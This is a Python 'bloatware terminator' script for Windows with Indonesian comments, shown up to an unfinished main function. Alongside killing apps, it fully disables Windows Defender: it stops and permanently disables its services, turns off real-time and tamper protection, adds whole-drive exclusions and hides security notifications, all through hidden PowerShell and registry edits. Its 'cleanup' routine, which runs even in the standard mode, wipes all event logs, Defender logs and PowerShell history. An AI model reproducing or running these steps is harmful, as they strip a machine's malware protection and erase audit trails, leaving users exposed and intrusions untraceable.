import subprocess
import time
import os
import sys
from typing import List, Set, Dict
import threading

# Auto-install psutil if not available
try:
    import psutil
except ImportError:
    print("📦 psutil not found. Installing automatically...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
        print("✅ psutil installed successfully!")
        import psutil
        print("✅ psutil imported successfully!")
    except subprocess.CalledProcessError as e:
        print(f"❌ Failed to install psutil: {e}")
        print("Please install psutil manually with: pip install psutil")
        input("Press Enter to exit...")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Unexpected error during psutil installation: {e}")
        input("Press Enter to exit...")
        sys.exit(1)

class ProcessKiller:
    def __init__(self):
        # Daftar aplikasi yang akan di-terminate
        self.target_processes = [
            # Browser
            'chrome.exe',
            'msedge.exe',
            'firefox.exe',
            'brave.exe',
            'msedgewebview2.exe',
            
            # Software bloatware umum
            'Teams.exe',
            'Skype.exe',
            'Spotify.exe',
            'Discord.exe',
            'WhatsApp.exe',
            'Cloudflare WARP.exe',
            'warp-svc.exe',
            
            # Software Adobe
            'AdobeUpdateService.exe',
            'CCXProcess.exe',
            'CCLibrary.exe',
            
            # Software antivirus dan Windows Defender
            'avast.exe',
            'avgui.exe',
            'mcshield.exe',
            'NisSrv.exe',
            'MpDefenderCoreService.exe',
            'MsMpEng.exe',
            'SecurityHealthService.exe',
            
            # Gaming platforms
            'steam.exe',
            'origin.exe',
            'epicgameslauncher.exe',
            'XboxPcAppFT.exe',
            'gamingservices.exe',
            'gamingservicesnet.exe',
            
            # Windows services dan aplikasi lainnya
            'SearchIndexer.exe',
            'Widgets.exe',
            'WidgetService.exe',
            'PrintSpooler.exe',
            'OfficeClickToRun.exe'
        ]
        
        # Process yang tidak boleh di-kill (sistem kritis)
        self.protected_processes = [
            'System',
            'Registry',
            'smss.exe',
            'csrss.exe',
            'wininit.exe',
            'winlogon.exe',
            'services.exe',
            'lsass.exe',
            'svchost.exe',
            'explorer.exe',
            'dwm.exe'
        ]

        # Super stubborn processes yang butuh treatment khusus
        self.stubborn_processes = [
            'msedgewebview2.exe',
            'MsMpEng.exe',
            'MpDefenderCoreService.exe',
            'SecurityHealthService.exe'
        ]

    def is_admin(self) -> bool:
        """Check if script is running as administrator"""
        try:
            return os.getuid() == 0
        except AttributeError:
            # Windows
            try:
                return subprocess.run(['net', 'session'], 
                                    capture_output=True, 
                                    check=True).returncode == 0
            except (subprocess.CalledProcessError, FileNotFoundError):
                return False

    def request_admin_privileges(self):
        """Request administrator privileges"""
        if self.is_admin():
            return True
        
        print("🔐 Administrator privileges required for stubborn processes!")
        print("   Attempting to restart with admin rights...")
        
        try:
            # Re-run the script with admin privileges
            subprocess.run(['powershell', '-Command', 
                          f'Start-Process python -ArgumentList "{__file__}" -Verb RunAs'],
                          check=True)
            return False
        except:
            print("❌ Failed to get admin privileges")
            return False

    def get_all_processes(self) -> Dict[str, List[Dict]]:
        """Get all running processes organized by name"""
        processes = {}
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
                try:
                    name = proc.info['name']
                    if name not in processes:
                        processes[name] = []
                    
                    processes[name].append({
                        'pid': proc.info['pid'],
                        'name': name,
                        'cpu': proc.info['cpu_percent'] or 0,
                        'memory': proc.info['memory_info'].rss / (1024*1024) if proc.info['memory_info'] else 0  # MB
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
        except Exception as e:
            print(f"Error getting process list: {e}")
        
        return processes

    def display_processes(self):
        """Display all running processes"""
        print("🔍 SCANNING ALL RUNNING PROCESSES...")
        print("="*80)
        
        processes = self.get_all_processes()
        
        if not processes:
            print("❌ No processes found or access denied")
            return
        
        # Sort by name
        sorted_processes = sorted(processes.items())
        
        print(f"{'Process Name':<30} {'PID':<8} {'CPU%':<8} {'Memory(MB)':<12}")
        print("-" * 80)
        
        for name, proc_list in sorted_processes:
            for proc in proc_list:
                status = "🎯" if name in self.target_processes else "  "
                protected = "🛡️" if name in self.protected_processes else "  "
                print(f"{status}{protected} {name:<28} {proc['pid']:<8} {proc['cpu']:<8.1f} {proc['memory']:<12.1f}")
        
        print("\n🎯 = Target process | 🛡️ = Protected process")

    def search_processes(self, search_term: str) -> List[Dict]:
        """Search for processes by name"""
        processes = self.get_all_processes()
        results = []
        
        search_term = search_term.lower()
        
        for name, proc_list in processes.items():
            if search_term in name.lower():
                for proc in proc_list:
                    results.append(proc)
        
        return results

    def interactive_process_selection(self):
        """Interactive menu for process selection"""
        while True:
            print("\n" + "="*50)
            print("🎯 INTERACTIVE PROCESS MANAGER")
            print("="*50)
            print("1. View all running processes")
            print("2. Search for specific process")
            print("3. Kill selected processes manually")
            print("4. Kill all target processes (auto)")
            print("5. Kill stubborn processes (EXTREME)")
            print("0. Back to main menu")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self.display_processes()
                input("\nPress Enter to continue...")
                
            elif choice == "2":
                search_term = input("Enter process name to search: ").strip()
                if search_term:
                    results = self.search_processes(search_term)
                    if results:
                        print(f"\n🔍 Found {len(results)} matching processes:")
                        print(f"{'PID':<8} {'Name':<30} {'CPU%':<8} {'Memory(MB)'}")
                        print("-" * 60)
                        for proc in results:
                            print(f"{proc['pid']:<8} {proc['name']:<30} {proc['cpu']:<8.1f} {proc['memory']:<12.1f}")
                    else:
                        print("❌ No matching processes found")
                    input("\nPress Enter to continue...")
                    
            elif choice == "3":
                self.manual_process_kill()
                
            elif choice == "4":
                self.kill_all_targets()
                input("\nPress Enter to continue...")
                
            elif choice == "5":
                self.extreme_kill_mode()
                input("\nPress Enter to continue...")
                
            elif choice == "0":
                break
                
            else:
                print("❌ Invalid option!")

    def manual_process_kill(self):
        """Manual process selection and killing"""
        search_term = input("Enter process name to kill: ").strip()
        if not search_term:
            return
            
        results = self.search_processes(search_term)
        if not results:
            print("❌ No matching processes found")
            return
            
        print(f"\n🔍 Found {len(results)} matching processes:")
        for i, proc in enumerate(results, 1):
            protected = "🛡️ PROTECTED" if proc['name'] in self.protected_processes else ""
            print(f"{i}. PID: {proc['pid']:<8} {proc['name']:<30} {protected}")
        
        print("0. Cancel")
        
        try:
            choice = int(input("\nSelect process to kill (number): "))
            if choice == 0:
                return
            if 1 <= choice <= len(results):
                selected_proc = results[choice - 1]
                
                if selected_proc['name'] in self.protected_processes:
                    print("❌ Cannot kill protected system process!")
                    return
                
                confirm = input(f"⚠️  Kill {selected_proc['name']} (PID: {selected_proc['pid']})? (y/N): ")
                if confirm.lower() in ['y', 'yes']:
                    self.nuclear_kill_process(selected_proc['name'], selected_proc['pid'])
            else:
                print("❌ Invalid selection!")
        except ValueError:
            print("❌ Invalid input!")

    def disable_windows_defender_nuclear(self):
        """Nuclear option to disable Windows Defender + Memory cleanup"""
        print("🚀 LAUNCHING NUCLEAR DEFENDER SHUTDOWN + MEMORY CLEANUP...")
        
        # Phase 1: Stop Defender Services immediately
        print("Phase 1: Emergency Defender Service Termination...")
        defender_services = [
            'WinDefend', 'WdNisSvc', 'SecurityHealthService', 'MpDefenderCoreService',
            'Sense', 'MsSense', 'DiagTrack', 'WerSvc'
        ]
        
        for service in defender_services:
            try:
                # Multiple methods to stop services
                subprocess.run(['net', 'stop', service], capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.run(['sc', 'stop', service], capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command',
                              f'Stop-Service -Name "{service}" -Force -ErrorAction SilentlyContinue'],
                              capture_output=True, timeout=5,
                              creationflags=subprocess.CREATE_NO_WINDOW)
                print(f"🔴 Service {service} terminated")
            except Exception:
                pass
        
        # Phase 2: Disable via PowerShell with multiple methods
        print("Phase 2: PowerShell Defender Disabling...")
        ps_commands = [
            # Real-time protection
            'Set-MpPreference -DisableRealtimeMonitoring $true -Force',
            'Set-MpPreference -DisableOnAccessProtection $true -Force',
            'Set-MpPreference -DisableBehaviorMonitoring $true -Force',
            'Set-MpPreference -DisableScanOnRealtimeEnable $false -Force',
            'Set-MpPreference -DisableIOAVProtection $true -Force',
            'Set-MpPreference -DisablePrivacyMode $true -Force',
            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force',
            
            # Cloud protection
            'Set-MpPreference -MAPSReporting 0 -Force',
            'Set-MpPreference -SubmitSamplesConsent 2 -Force',
            'Set-MpPreference -DisableCloudProtection $true -Force',
            
            # Disable automatic sample submission
            'Set-MpPreference -DisableAutoExclusions $true -Force',
            'Set-MpPreference -DisableEmailScanning $true -Force',
            'Set-MpPreference -DisableScriptScanning $true -Force',
            
            # Turn off Windows Defender completely
            'Set-MpPreference -DisableAntiSpyware $true -Force',
            'Set-MpPreference -DisableAntiVirus $true -Force',
            
            # Advanced disabling
            'Add-MpPreference -ExclusionPath "C:\\" -Force',
            'Set-MpPreference -ExclusionPath @("C:\\", "D:\\", "E:\\", "F:\\") -Force',
            
            # Disable Windows Security notifications
            'Set-MpPreference -UILockdown $true -Force',
            'Set-MpPreference -DisableTlsParsing $true -Force'
        ]
        
        for cmd in ps_commands:
            try:
                subprocess.run([
                    'powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', 
                    '-Command', cmd
                ], capture_output=True, timeout=8,
                creationflags=subprocess.CREATE_NO_WINDOW)
                print(f"✅ Executed: {cmd[:50]}...")
            except Exception:
                pass
        
        # Phase 3: Registry Nuclear Options
        print("Phase 3: Registry Nuclear Modifications...")
        registry_commands = [
            # Main Defender disable
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
            
            # Tamper Protection disable
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtectionSource /t REG_DWORD /d 2 /f',
            
            # Windows Security Center disable
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Systray" /v HideSystray /t REG_DWORD /d 1 /f',
            
            # Disable Windows Defender via multiple registry paths
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend" /v Start /t REG_DWORD /d 4 /f',
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc" /v Start /t REG_DWORD /d 4 /f',
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f'
        ]
        
        for reg_cmd in registry_commands:
            try:
                subprocess.run(reg_cmd, shell=True, capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
                print(f"🔧 Registry: {reg_cmd.split('/')[-3] if '/' in reg_cmd else reg_cmd[:30]}...")
            except Exception:
                pass
        
        # Phase 4: Memory Cleanup & Cache Clearing
        print("Phase 4: Memory Cleanup & Cache Clearing...")
        self.clear_memory_and_cache()
        
        # Phase 5: Final service disable
        print("Phase 5: Final Service Disabling...")
        for service in defender_services:
            try:
                subprocess.run(['sc', 'config', service, 'start=', 'disabled'], 
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
                print(f"🔒 Service {service} disabled permanently")
            except Exception:
                pass
        
        print("☢️  NUCLEAR DEFENDER SHUTDOWN COMPLETED!")

    def clear_memory_and_cache(self):
        """Clear system memory and cache"""
        print("🧹 MEMORY & CACHE CLEANUP INITIATED...")
        
        try:
            # Phase 1: Windows Memory Diagnostic & Cleanup
            memory_commands = [
                # Clear DNS cache
                'ipconfig /flushdns',
                # Clear ARP cache
                'arp -d *',
                # Clear NetBios cache
                'nbtstat -R',
                # Clear routing table cache
                'route -f',
                # Windows Memory Cleanup
                'rundll32.exe advapi32.dll,ProcessIdleTasks',
                # Clear Windows Update cache
                'net stop wuauserv',
                'net stop cryptSvc', 
                'net stop bits',
                'net stop msiserver'
            ]
            
            for cmd in memory_commands:
                try:
                    subprocess.run(cmd.split(), capture_output=True, timeout=10,
                                 creationflags=subprocess.CREATE_NO_WINDOW)
                    print(f"🧹 Executed: {cmd[:30]}...")
                except Exception:
                    pass
            
            # Phase 2: PowerShell Memory Cleanup
            ps_memory_commands = [
                # Force garbage collection
                '[System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers(); [System.GC]::Collect()',
                
                # Clear PowerShell history and cache
                'Clear-History; Remove-Variable * -ErrorAction SilentlyContinue',
                
                # Clear Windows Error Reporting cache
                'Get-ChildItem "C:\\ProgramData\\Microsoft\\Windows\\WER" -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue',
                
                # Clear Windows Temp files
                'Get-ChildItem "C:\\Windows\\Temp" -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue',
                'Get-ChildItem "$env:TEMP" -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue',
                
                # Clear Windows Prefetch
                'Get-ChildItem "C:\\Windows\\Prefetch" -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue',
                
                # Clear Windows Logs
                'Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log -ErrorAction SilentlyContinue }',
                
                # Clear IIS logs if present
                'Get-ChildItem "C:\\inetpub\\logs" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue',
                
                # Clear Windows Defender logs and cache
                'Get-ChildItem "C:\\ProgramData\\Microsoft\\Windows Defender" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue',
                
                # Memory trimming for all processes
                'Get-Process | ForEach-Object { try { $_.ProcessorAffinity = $_.ProcessorAffinity } catch { } }'
            ]
            
            for ps_cmd in ps_memory_commands:
                try:
                    subprocess.run([
                        'powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
                        '-Command', ps_cmd
                    ], capture_output=True, timeout=15,
                    creationflags=subprocess.CREATE_NO_WINDOW)
                    print(f"🧹 PowerShell cleanup: {ps_cmd[:40]}...")
                except Exception:
                    pass
            
            # Phase 3: Disk Cleanup using cleanmgr
            try:
                print("🧹 Running Disk Cleanup...")
                subprocess.run([
                    'cleanmgr', '/sagerun:1'
                ], capture_output=True, timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception:
                pass
            
            # Phase 4: Memory compaction via PowerShell
            try:
                compact_cmd = '''
                $processes = Get-Process
                foreach ($process in $processes) {
                    try {
                        $process.MinWorkingSet = $process.MinWorkingSet
                        $process.MaxWorkingSet = $process.MaxWorkingSet
                    } catch { }
                }
                [System.GC]::Collect()
                [System.GC]::WaitForPendingFinalizers()
                [System.GC]::Collect()
                '''
                
                subprocess.run([
                    'powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
                    '-Command', compact_cmd
                ], capture_output=True, timeout=20,
                creationflags=subprocess.CREATE_NO_WINDOW)
                print("🧹 Memory compaction completed")
            except Exception:
                pass
            
            # Phase 5: Final memory stats
            try:
                memory_info = psutil.virtual_memory()
                print(f"💾 Memory after cleanup: {memory_info.percent:.1f}% used")
                print(f"💾 Available memory: {memory_info.available / (1024**3):.1f} GB")
            except Exception:
                pass
                
            print("🧹 MEMORY & CACHE CLEANUP COMPLETED!")
            
        except Exception as e:
            print(f"⚠️  Memory cleanup error: {e}")
            print("🧹 Partial cleanup completed")

    def nuclear_kill_process(self, process_name: str, pid: int = None) -> bool:
        """Nuclear option - spam kill until process is dead"""
        print(f"☢️  NUCLEAR KILL MODE: {process_name}")
        
        max_attempts = 50
        attempt = 0
        killed = False
        
        # Exception handling untuk mencegah crash
        try:
            while attempt < max_attempts and not killed:
                attempt += 1
                
                # Progress indicator yang aman
                try:
                    print(f"💀 Attempt {attempt:2d}/{max_attempts}: Targeting {process_name}...", end="", flush=True)
                    
                    # Get all processes with this name - dengan exception handling
                    targets = []
                    try:
                        for proc in psutil.process_iter(['pid', 'name']):
                            try:
                                if proc.info['name'].lower() == process_name.lower():
                                    targets.append(proc)
                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                                continue
                    except Exception:
                        # Jika ada error saat iterasi, coba metode alternatif
                        try:
                            for proc in psutil.process_iter():
                                if proc.name().lower() == process_name.lower():
                                    targets.append(proc)
                        except Exception:
                            pass
                    
                    if not targets:
                        print(" ✅ DEAD!")
                        killed = True
                        break
                    
                    print(f" [{len(targets)} instances]")
                    
                    # Safe multi-method attack dengan timeout
                    for proc in targets:
                        try:
                            # Method 1: Terminate dengan timeout
                            try:
                                proc.terminate()
                            except Exception:
                                pass
                            
                            # Method 2: Kill dengan timeout
                            try:
                                proc.kill()
                            except Exception:
                                pass
                            
                            # Method 3: Multiple signals
                            for sig in [15, 9, 2, 1]:  # SIGTERM, SIGKILL, SIGINT, SIGHUP
                                try:
                                    proc.send_signal(sig)
                                except Exception:
                                    pass
                        except Exception:
                            continue
                    
                    # Safe taskkill commands dengan timeout
                    safe_commands = [
                        ['taskkill', '/F', '/IM', process_name],
                        ['taskkill', '/F', '/T', '/IM', process_name]
                    ]
                    
                    if pid:
                        safe_commands.append(['taskkill', '/F', '/PID', str(pid)])
                    
                    for cmd in safe_commands:
                        try:
                            subprocess.run(cmd, capture_output=True, timeout=2, 
                                         creationflags=subprocess.CREATE_NO_WINDOW)
                        except Exception:
                            pass
                    
                    # WMIC termination dengan safety
                    try:
                        subprocess.run([
                            'wmic', 'process', 'where', f'name="{process_name}"', 'delete'
                        ], capture_output=True, timeout=3, 
                        creationflags=subprocess.CREATE_NO_WINDOW)
                    except Exception:
                        pass
                    
                    # PowerShell termination sebagai backup
                    try:
                        ps_cmd = f'Get-Process -Name "{process_name.replace(".exe", "")}" -ErrorAction SilentlyContinue | Stop-Process -Force'
                        subprocess.run([
                            'powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd
                        ], capture_output=True, timeout=3,
                        creationflags=subprocess.CREATE_NO_WINDOW)
                    except Exception:
                        pass
                    
                    # Reduce sleep untuk speed tapi cegah spam
                    time.sleep(0.2)
                    
                except KeyboardInterrupt:
                    print("\n⚠️  Nuclear kill interrupted by user!")
                    return False
                except Exception as e:
                    print(f" ❌ Error in attempt {attempt}: {str(e)[:50]}")
                    continue
        
        except Exception as e:
            print(f"\n💥 Critical error in nuclear kill: {e}")
            print("Falling back to standard methods...")
            return False
        
        if killed:
            print(f"☢️  {process_name} SUCCESSFULLY NUKED after {attempt} attempts!")
        else:
            print(f"💀 {process_name} survived nuclear attack - may be immortal!")
        
        return killed

    def kill_method_1(self, proc):
        """Kill method 1: Standard terminate"""
        try:
            proc.terminate()
        except:
            pass

    def kill_method_2(self, proc):
        """Kill method 2: Force kill"""
        try:
            proc.kill()
        except:
            pass

    def kill_method_3(self, proc):
        """Kill method 3: Send SIGKILL if available"""
        try:
            proc.send_signal(9)  # SIGKILL
        except:
            pass

    def kill_method_4(self, proc):
        """Kill method 4: Multiple signals"""
        try:
            proc.send_signal(15)  # SIGTERM
            proc.send_signal(2)   # SIGINT
            proc.send_signal(1)   # SIGHUP
        except:
            pass

    def extreme_kill_mode(self):
        """Extreme mode - nuclear kill for stubborn processes"""
        print("☢️  EXTREME KILL MODE ACTIVATED")
        print("="*50)
        print("⚠️  This mode uses NUCLEAR methods!")
        print("⚠️  Includes Windows Defender shutdown!")
        print("⚠️  May cause temporary system instability!")
        
        confirm = input("\nProceed with EXTREME mode? (type 'NUKE' to confirm): ")
        if confirm != 'NUKE':
            print("Operation cancelled.")
            return
        
        if not self.is_admin():
            print("🔐 Administrator privileges required for EXTREME mode!")
            if not self.request_admin_privileges():
                return
        
        # Use the method with Defender shutdown for extreme mode
        self.kill_all_targets_with_defender_shutdown()
        
        # Additional nuclear kill for any remaining stubborn processes
        print("\n☢️  ADDITIONAL NUCLEAR SWEEP...")
        for process_name in self.stubborn_processes:
            running_procs = []
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'].lower() == process_name.lower():
                        running_procs.append(proc)
            except:
                continue
                
            if running_procs:
                print(f"\n🎯 Found {len(running_procs)} remaining instances of {process_name}")
                for proc in running_procs:
                    self.nuclear_kill_process(process_name, proc.pid)
        
        print("\n☢️  EXTREME KILL MODE COMPLETED!")

    def verify_process_killed(self, process_name: str) -> bool:
        """Verify if a process is actually killed"""
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == process_name.lower():
                    return False
            return True
        except:
            return True

    def get_running_processes(self) -> Set[str]:
        """Get list of currently running processes"""
        running = set()
        try:
            for proc in psutil.process_iter(['name']):
                try:
                    running.add(proc.info['name'].lower())
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception as e:
            print(f"Error getting process list: {e}")
        return running

    def find_target_processes(self) -> List[psutil.Process]:
        """Find target processes that are currently running"""
        target_procs = []
        running_processes = self.get_running_processes()
        
        for target in self.target_processes:
            if target.lower() in running_processes:
                try:
                    for proc in psutil.process_iter(['pid', 'name']):
                        if proc.info['name'].lower() == target.lower():
                            if proc.info['name'] not in self.protected_processes:
                                target_procs.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        
        return target_procs

    def kill_process_gentle(self, process: psutil.Process) -> bool:
        """Try to terminate process gently first"""
        try:
            print(f"Trying gentle termination of {process.name()} (PID: {process.pid})")
            process.terminate()
            
            try:
                process.wait(timeout=3)
                if self.verify_process_killed(process.name()):
                    print(f"✓ Successfully terminated {process.name()}")
                    return True
                else:
                    return False
            except psutil.TimeoutExpired:
                return False
                
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            print(f"✓ Process {process.name()} already terminated or inaccessible")
            return True
        except Exception as e:
            print(f"✗ Error terminating {process.name()}: {e}")
            return False

    def kill_process_force(self, process: psutil.Process) -> bool:
        """Force kill process using kill()"""
        try:
            print(f"Force killing {process.name()} (PID: {process.pid})")
            process.kill()
            
            try:
                process.wait(timeout=2)
                if self.verify_process_killed(process.name()):
                    print(f"✓ Successfully force killed {process.name()}")
                    return True
                else:
                    return False
            except psutil.TimeoutExpired:
                return False
                
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            print(f"✓ Process {process.name()} already terminated or inaccessible")
            return True
        except Exception as e:
            print(f"✗ Error force killing {process.name()}: {e}")
            return False

    def kill_process_taskkill(self, process_name: str, pid: int) -> bool:
        """Use Windows taskkill command as last resort"""
        try:
            print(f"Using taskkill for {process_name} (PID: {pid})")
            
            result = subprocess.run(['taskkill', '/F', '/PID', str(pid)], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                time.sleep(1)
                if self.verify_process_killed(process_name):
                    print(f"✓ Successfully killed {process_name} with taskkill")
                    return True
            
            result = subprocess.run(['taskkill', '/F', '/IM', process_name], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                time.sleep(1)
                if self.verify_process_killed(process_name):
                    print(f"✓ Successfully killed {process_name} with taskkill by name")
                    return True
                else:
                    print(f"⚠️  Taskkill reported success but process still running!")
                    return False
            else:
                print(f"✗ Taskkill failed for {process_name}: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"✗ Error using taskkill for {process_name}: {e}")
            return False

    def kill_all_targets(self):
        """Main method to kill all target processes - Standard mode without Defender shutdown"""
        if not self.is_admin():
            print("⚠️  Warning: Not running as administrator. Some processes may not be killable.")
            print("   For best results, run this script as administrator.")
            print()

        print("🔍 Scanning for target processes...")
        target_procs = self.find_target_processes()
        
        if not target_procs:
            print("✓ No target processes found running!")
            print("\n🧹 Running cache cleanup anyway...")
            self.clear_memory_and_cache()
            return

        print(f"Found {len(target_procs)} target processes to terminate:")
        for proc in target_procs:
            try:
                print(f"  - {proc.name()} (PID: {proc.pid})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        print("\n🚀 Starting standard termination process...\n")

        failed_processes = []

        # Phase 1: Gentle termination
        print("Phase 1: Gentle termination...")
        for proc in target_procs[:]:
            try:
                if not self.kill_process_gentle(proc):
                    failed_processes.append(proc)
                else:
                    target_procs.remove(proc)
            except:
                failed_processes.append(proc)

        time.sleep(2)

        # Phase 2: Force kill
        if failed_processes:
            print(f"\nPhase 2: Force killing {len(failed_processes)} stubborn processes...")
            still_failed = []
            
            for proc in failed_processes:
                try:
                    if not self.kill_process_force(proc):
                        still_failed.append(proc)
                except:
                    still_failed.append(proc)

            failed_processes = still_failed
            time.sleep(2)

        # Phase 3: Taskkill command
        if failed_processes:
            print(f"\nPhase 3: Using taskkill for {len(failed_processes)} remaining processes...")
            ultra_failed = []
            
            for proc in failed_processes:
                try:
                    if not self.kill_process_taskkill(proc.name(), proc.pid):
                        ultra_failed.append(proc)
                except:
                    ultra_failed.append(proc)
            
            failed_processes = ultra_failed

        # Phase 4: Memory and Cache cleanup
        print("\n🧹 Phase 4: Memory and Cache cleanup...")
        self.clear_memory_and_cache()

        print("\n" + "="*50)
        print("🎉 Process termination completed!")
        
        # Final verification
        remaining = self.find_target_processes()
        if remaining:
            print(f"⚠️  {len(remaining)} processes are still running:")
            for proc in remaining:
                try:
                    print(f"  - {proc.name()} (PID: {proc.pid})")
                except:
                    continue
            print("\n💡 For stubborn processes, try 'Nuclear Mode (EXTREME)' from main menu!")
        else:
            print("✅ ALL TARGET PROCESSES SUCCESSFULLY TERMINATED!")
            print("✅ MEMORY AND CACHE CLEANUP COMPLETED!")

    def kill_all_targets_with_defender_shutdown(self):
        """Alternative method that includes Defender shutdown - used in Nuclear Mode"""
        if not self.is_admin():
            print("⚠️  Warning: Not running as administrator. Some processes may not be killable.")
            print("   For best results, run this script as administrator.")
            print()

        print("🔍 Scanning for target processes...")
        target_procs = self.find_target_processes()
        
        if not target_procs:
            print("✓ No target processes found running!")
            return

        print(f"Found {len(target_procs)} target processes to terminate:")
        for proc in target_procs:
            try:
                stubborn = "💀" if proc.name() in self.stubborn_processes else ""
                print(f"  - {stubborn} {proc.name()} (PID: {proc.pid})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        print("\n🚀 Starting termination process with Defender shutdown...\n")

        # Special handling for Windows Defender
        defender_processes = [p for p in target_procs 
                            if p.name() in ['MsMpEng.exe', 'MpDefenderCoreService.exe', 'SecurityHealthService.exe']]
        if defender_processes:
            print("🛡️  Disabling Windows Defender first...")
            self.disable_windows_defender_nuclear()
            time.sleep(3)

        failed_processes = []

        # Phase 1: Gentle termination
        print("Phase 1: Gentle termination...")
        for proc in target_procs[:]:
            try:
                if not self.kill_process_gentle(proc):
                    failed_processes.append(proc)
                else:
                    target_procs.remove(proc)
            except:
                failed_processes.append(proc)

        time.sleep(2)

        # Phase 2: Force kill
        if failed_processes:
            print(f"\nPhase 2: Force killing {len(failed_processes)} stubborn processes...")
            still_failed = []
            
            for proc in failed_processes:
                try:
                    if not self.kill_process_force(proc):
                        still_failed.append(proc)
                except:
                    still_failed.append(proc)

            failed_processes = still_failed
            time.sleep(2)

        # Phase 3: Taskkill command
        if failed_processes:
            print(f"\nPhase 3: Using taskkill for {len(failed_processes)} remaining processes...")
            ultra_failed = []
            
            for proc in failed_processes:
                try:
                    if not self.kill_process_taskkill(proc.name(), proc.pid):
                        ultra_failed.append(proc)
                except:
                    ultra_failed.append(proc)
            
            failed_processes = ultra_failed

        # Phase 4: Nuclear option for super stubborn processes
        if failed_processes:
            super_stubborn = [p for p in failed_processes if p.name() in self.stubborn_processes]
            if super_stubborn:
                print(f"\n☢️  Phase 4: NUCLEAR MODE for {len(super_stubborn)} super stubborn processes...")
                for proc in super_stubborn:
                    try:
                        self.nuclear_kill_process(proc.name(), proc.pid)
                    except:
                        print(f"☢️  Nuclear kill failed for {proc.name()}")

        print("\n" + "="*50)
        print("🎉 Process termination completed!")
        
        # Final verification
        remaining = self.find_target_processes()
        if remaining:
            print(f"⚠️  {len(remaining)} processes are still running:")
            for proc in remaining:
                try:
                    print(f"  - 🧟 {proc.name()} (PID: {proc.pid}) - ZOMBIE PROCESS")
                except:
                    continue
            print("\n💡 Try running EXTREME mode for zombie processes!")
        else:
            print("✅ ALL TARGET PROCESSES SUCCESSFULLY TERMINATED!")

def main():
    print("🔥 FORCE PROCESS KILLER - BLOATWARE TERMINATOR v2.0 🔥")
    print("="*60)
    print("📦 Dependencies checked and ready!")
    print("⚠️  WARNING: This tool can aggressively terminate processes!")
    print()
    
    # Show system info
    try:
        print(f"💻 System: {os.name}")
        print(f"🐍 Python: {sys.version.split()[0]}")
        print(f"📊 psutil: {psutil.__version__}")
        admin_status = "✅ Administrator" if ProcessKiller().is_admin() else "❌ Standard User"
        print(f"🔐 Privileges: {admin_status}")
        print()
    except Exception as e:
        print(f"System info unavailable: {e}")
        print()
    
